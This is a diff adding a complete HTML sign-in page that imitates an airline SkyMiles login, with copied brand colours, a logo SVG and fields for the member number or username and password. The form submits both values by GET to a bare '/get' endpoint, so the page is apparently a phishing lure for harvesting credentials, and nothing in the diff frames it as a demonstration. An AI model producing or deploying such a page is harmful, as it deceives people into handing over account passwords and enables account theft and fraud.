@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: 'Arial', sans-serif;
+  margin: 0;
+  padding: 0;
+  background-color: #f3f3f3;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+}
+
+.container {
+  max-width: 500px;
+  padding: 20px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  background: #fff;
+  border-radius: 8px;
+}
+
+.logo {
+  display: flex;
+  justify-content: center;
+  margin-bottom: 20px;
+}
+
+.logo svg {
+  width: 50%;
+}
+
+.title, .sub-title {
+  text-align: center;
+  margin-bottom: 20px;
+}
+
+.form-group {
+  margin-bottom: 20px;
+  display: flex;
+  justify-content: center;
+}
+
+.input-field {
+  width: 100%;
+  max-width: 400px;
+  height: 40px;
+  padding: 10px;
+  border-radius: 5px;
+  border: 1px solid #ccc;
+  font-size: 16px;
+}
+
+.button {
+  width: 100%;
+  max-width: 400px;
+  height: 40px;
+  background-color: #003D79;
+  color: #fff;
+  border: none;
+  border-radius: 5px; 
+  cursor: pointer;
+}
+
+@media screen and (max-width: 600px) {
+  .container {
+    margin: 10px;
+  }
+
+  .logo svg {
+    width: 70%;
+  }
+
+  .input-field, .button {
+    max-width: 100%;
+  }
+}
+</style>
+</head>
+<body>
+<div class="container">
+
+<div class="logo">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 766 118">
+  <path fill="#98002E" d="M142 105 74 72V0l68 105zm6 13L74 87v31h74z"/>
+  <path fill="#E31937" d="M5 105 74 0v72zm-5 13h74V87z"/>
+  <path fill="#98002E" d="M154 96a5 5 0 0 1 0 10 5 5 0 0 1 0-10m0 9a4 4 0 0 0 4-4 4 4 0 1 0-8 0 4 4 0 0 0 4 4m-1-1h-1v-6h2l2 2-2 2 2 2h-1l-1-2h-1v2zm0-3h1l1-1-1-1h-1v2z"/>
+  <path fill="#003D79" d="M205 105h34c34 0 54-17 54-47 0-29-20-47-54-47h-34v94zm21-77h13c22 0 33 11 33 30 0 20-11 31-33 31h-13V28zm138 37h40V48h-40V28h45V11h-66v94h68V89h-47zm167 24h-41V11h-21v94h62zm113-78h-84v17h31v77h21V28h32zm122 94h-22l-9-23h-38l-10 23h-20l39-94h21l39 94zm-37-39-13-33-13 33h26z"/>
+</svg>
+</div>
+
+<h1 class="title">Sign in</h1>
+
+<h2 class="sub-title">Using your SkyMiles number or username and password.</h2>
+
+<form action="/get" id="email-form-step" method="GET">
+
+<div class="form-group">
+<input class="input-field" name="email" type="text" placeholder="SkyMiles # or Username" required>
+</div>
+
+<div class="form-group">
+<input class="input-field" name="password" type="password" placeholder="Password" required>
+</div>
+
+<div class="form-group">
+<button class="button" type="submit">Sign In</button>
+</div>
+
+</form>
+
+</div>
+</body>
+</html>
